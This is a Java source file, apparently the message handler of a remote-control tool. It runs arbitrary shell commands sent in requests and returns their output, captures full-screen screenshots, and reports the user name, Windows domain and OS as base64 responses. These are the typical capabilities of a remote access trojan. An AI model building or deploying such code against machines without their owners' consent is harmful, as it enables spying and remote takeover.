/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package protocol;


import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import com.sun.security.auth.module.NTSystem;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;
import javax.imageio.ImageIO;
import utils.CommandLine;

/**
 *
 * @author Tim
 */
public class MessageParser {
    
    
    // creates response from a request message
    static public Message compileResponse(Message ms){
        
        Message response = null;
        
        // determines type of request and creates reponse accordingly
        switch(ms.getAction()){

            // get the date
            case "<date>":
                
                SimpleDateFormat sd = new SimpleDateFormat("yyyy.MM.dd G 'at' HH:mm:ss z");
                Date date = new Date();
                sd.setTimeZone(TimeZone.getTimeZone("IST"));
        
                
                
                response = new Message("<date>", date.toString());
                break;
            // send a command
            case "<cmd>":
                
                String output = CommandLine.executeCommand(ms.getActionData());
                output = Base64.encode(output.getBytes());
                response = new Message("<cmd>", output);
                break;
                
            // get a screenshot
            case "<screenshot>":
                
                Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
                Rectangle rect = new Rectangle(dim);
                Robot robot = null;
                try {
                    robot = new Robot();
                } catch (java.awt.AWTException ex) {
                    java.util.logging.Logger.getLogger(MessageParser.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
                }
                BufferedImage image = robot.createScreenCapture(rect);
                ByteArrayOutputStream bstream = new ByteArrayOutputStream(1024);
                try{
                    ImageIO.write(image,"png", bstream);
                    bstream.flush();
                    bstream.close();
                }catch(IOException ex){
                    
                }
                
                String image_str = Base64.encode(bstream.toByteArray());
                response = new Message("<screenshot>", image_str);
                break;
            
            // not yet implemented
            case "<fileview>": 
             
                
                break;
            
            case "<system>":
                String os = System.getProperty("os.name");
                String user = System.getProperty("user.name");
                NTSystem nt = new NTSystem();
                String domain = nt.getDomain();
                String jver = System.getProperty("java.version");
                
                String d = "/";
                             
                response = new Message("<system>", user + d + domain + d + os + d + jver +d);
                break;
                
            case "<ping>":
                String placeholder="8";
                             
                response = new Message("<ping>", placeholder);
                break;
                
            default:
                
                break;
                
        }
        return response;
    }
    
    
    
}
